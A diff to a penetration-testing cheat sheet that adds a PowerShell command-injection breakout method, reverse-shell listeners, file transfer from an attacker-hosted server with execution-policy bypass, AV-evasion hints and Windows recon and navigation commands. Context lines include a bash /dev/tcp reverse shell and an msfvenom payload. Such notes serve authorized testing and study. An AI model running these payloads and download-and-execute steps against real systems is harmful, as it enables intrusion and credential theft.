@@ -12,6 +12,7 @@
 - [Post-Exploitation and Lateral Movement](#post-exploitation-and-lateral-movement)
 - [Active Directory](#active-directory)
 - [Windows Privilege Escalation](#windows-privilege-escalation)
+- [Windows CLI Navigation Cheat Sheet](#windows-cli-navigation-cheat-sheet)
 
 ---
 
@@ -336,6 +337,33 @@ $(id)
 ;bash -c 'bash -i >& /dev/tcp/<your-ip>/4444 0>&1'
 ```
 
+**Windows / PowerShell command injection breakout pattern** (confirmed against a log-viewer style
+`Get-Content('...')` sink during this engagement):
+
+```powershell
+# Test order: single char at a time, read the error TYPE not just the message.
+# 1. Baseline special chars first:
+"
+'
+;
+)
+#
+
+# A runtime error (e.g. "path not found") means your char became literal string content.
+# A PARSER error (e.g. "missing terminator", "missing closing ')' in expression")
+# means you broke out of the string/expression -- that's your confirmation.
+
+# 2. Once you know a leading quote closes the existing string, chain a command:
+';whoami;#
+# If this throws "Missing closing ')' in expression", your # ate the trailing
+# ')' the template still needed -- close the call yourself before commenting out the rest:
+');whoami;#
+
+# 3. Base64-encode more complex payloads (reverse shells, anything with its own quotes)
+# to avoid quote-collision with the outer injection context:
+powershell -enc <base64 UTF-16LE blob>
+```
+
 ---
 
 #### Open Redirect -- Manual Probe
@@ -420,6 +448,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f asp > 
 # Netcat listener
 nc -nvlp 4444
 
+# rlwrap for arrow-key/history support on a raw shell (attacker-side only,
+# doesn't touch the target, fixes a lot of what "stabilizing" means on Windows)
+rlwrap nc -nvlp 4444
+
 # Metasploit multi/handler (for meterpreter payloads)
 msfconsole
 use exploit/multi/handler
@@ -453,6 +485,11 @@ stty rows 38 cols 116
 # Background a meterpreter session
 background
 ```
+
+> NOTE: The above stabilization steps are Linux-target techniques (fixing a `/bin/bash` PTY).
+> They do not apply to a raw Windows PowerShell reverse shell -- see the
+> [Windows CLI Navigation Cheat Sheet](#windows-cli-navigation-cheat-sheet) below for the
+> Windows-side equivalent notes.
 
 ---
 
@@ -807,6 +844,7 @@ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 whoami
 whoami /priv
 whoami /groups
+whoami /all
 
 # System info (look for unpatched vulnerabilities)
 systeminfo
@@ -823,7 +861,18 @@ schtasks /query /fo LIST /v
 # List users and groups
 net users
 net localgroup administrators
+
+# Domain-context account -- check domain group membership
+# (local whoami output doesn't always expand nested domain groups)
+net user <username> /domain
+Get-ADUser -Identity <username> -Properties MemberOf | Select -ExpandProperty MemberOf
 ```
+
+**Reading `whoami /priv` correctly:** a privilege only matters if its **State** column
+says `Enabled`. A privilege that's entirely absent from the list (not even shown as
+`Disabled`) means that token capability isn't available to the account at all --
+e.g. no `SeImpersonatePrivilege` listed means Potato-family impersonation attacks
+aren't a viable path regardless of what else you find.
 
 ---
 
@@ -836,15 +885,25 @@ python3 -m http.server 8080
 # On target -- download winPEAS (PowerShell)
 Invoke-WebRequest -Uri http://<your-ip>:8080/winPEASx64.exe -OutFile C:\Temp\winpeas.exe
 
-# Alternatively with certutil
+# Alternatively with certutil (noisier / commonly AV-flagged)
 certutil -urlcache -f http://<your-ip>:8080/winPEASx64.exe C:\Temp\winpeas.exe
 
 # Run winPEAS
 C:\Temp\winpeas.exe
 
+# For a PowerShell recon script instead of the compiled binary
+# (useful when AV blocks known signatures, or you want auditable/readable output):
+Invoke-WebRequest -Uri http://<your-ip>:8080/recon.sh -OutFile C:\Windows\Temp\recon.ps1
+powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\recon.ps1
+
 # Cross-reference results with LOLBAS
 # https://lolbas-project.github.io/
 ```
+
+> NOTE: File extension matters for execution, not for hosting. The attacker-side filename
+> served over HTTP can be anything -- what matters is the extension you give it in
+> `-OutFile` on the Windows target. It must end in `.ps1` for `powershell -File` to run it;
+> `.sh` will be rejected as an unrecognized script type on Windows.
 
 ---
 
@@ -863,6 +922,104 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
 # Check stored credentials
 cmdkey /list
+```
+
+---
+
+## Windows CLI Navigation Cheat Sheet
+
+> Quick-reference for moving around and searching a Windows target from an interactive
+> shell, whether you land in `cmd.exe` or `PowerShell`. Confirm which shell you're in
+> first -- a PowerShell prompt reads `PS C:\path>`, cmd.exe reads `C:\path>` with no `PS`.
+> `$PSVersionTable` returns output in PowerShell and errors in cmd.exe; that's a quick test.
+
+### Identifying Your Shell
+
+```powershell
+# In PowerShell -- returns version info
+$PSVersionTable
+
+# Launch a nested PowerShell session from cmd.exe (if you landed in cmd but want
+# PowerShell cmdlets available)
+powershell
+```
+
+### Navigation
+
+| Task | PowerShell | cmd.exe |
+|------|-----------|---------|
+| Show current directory | `pwd` / `Get-Location` | `cd` (no args) |
+| Change directory | `cd <path>` | `cd <path>` |
+| Go up one level | `cd ..` | `cd ..` |
+| Go up two levels | `cd ../..` | `cd ..\..` |
+| List directory contents | `Get-ChildItem` / `ls` / `dir` | `dir` |
+| List hidden/system files | `Get-ChildItem -Force` | `dir /a` |
+| List recursively | `Get-ChildItem -Recurse` | `dir /s` |
+| Bare output (paths only) | `Get-ChildItem -Name` | `dir /b` |
+
+### Reading File Contents
+
+| Task | PowerShell | cmd.exe |
+|------|-----------|---------|
+| Print file contents | `Get-Content <path>` / `cat` / `gc` | `type <path>` |
+| Search file contents for a string | `Select-String "pattern" <path>` | *(no direct equivalent; use `findstr`)* |
+| Search contents, cmd-native | -- | `findstr /i "pattern" <path>` |
+
+### Finding Files
+
+```powershell
+# PowerShell -- recursive filename search from a given root, suppressing
+# access-denied noise so real hits aren't buried
+Get-ChildItem -Path C:\ -Recurse -Include "<filename>" -Force -ErrorAction SilentlyContinue
+
+# cmd.exe equivalent -- /s recurses from the given path, /b gives bare path output
+dir /s /b C:\<filename>
+
+# NOTE: dir /s /b <filename>   (no path) searches from your CURRENT directory down only.
+#       dir /s /b C:\<filename> searches the entire C: drive from root down.
+
+# where -- closest equivalent to `which`; searches PATH by default
+where <filename>.exe
+where /r C:\ <filename>.exe    # /r recurses a specific directory instead of PATH
+
+# Search file CONTENTS across many files (PowerShell grep-equivalent) --
+# useful for credential hunting in configs
+Get-ChildItem -Path C:\ -Recurse -Include *.config,*.txt -ErrorAction SilentlyContinue |
+    Select-String "password"
+```
+
+> NOTE: Windows has no direct equivalent to Linux `find` with its predicate-based syntax.
+> `find.exe` exists on Windows but is a legacy content-search tool (closer to `grep`),
+> not a filesystem-traversal tool -- don't expect Linux `find` flags to work with it.
+
+### Transferring Files to a Windows Target
+
+```powershell
+# From within a PowerShell reverse shell -- pull a file from your attacker-hosted server
+Invoke-WebRequest -Uri "http://<your-ip>:8000/<file>" -OutFile "C:\Windows\Temp\<file>"
+
+# Execution policy commonly blocks unsigned scripts by default -- bypass per-invocation
+# (does not change any persistent system setting)
+powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\<script>.ps1
+```
+
+Notes:
+- Extension on your attacker-side hosted file doesn't matter for serving it -- an HTTP
+  server sends bytes regardless of name. What matters is the extension you assign via
+  `-OutFile` on the target, since PowerShell decides how to treat a file by its extension
+  (`.ps1` for `-File`, not `.sh` or arbitrary names).
+- No Linux-style `chmod +x` step exists or is needed anywhere in this transfer/execution
+  chain -- Windows has no execute-bit equivalent; the only real gate is PowerShell's
+  execution policy, handled above with `-ExecutionPolicy Bypass`.
+
+### Privilege / Identity Recon Quick Reference
+
+```powershell
+whoami                  # current user
+whoami /priv             # privileges and their enabled/disabled state
+whoami /groups           # local + well-known group memberships
+whoami /all              # combined identity + groups + privileges
+$PSVersionTable          # confirm PowerShell version (cmdlet availability varies)
 ```
 
 ---
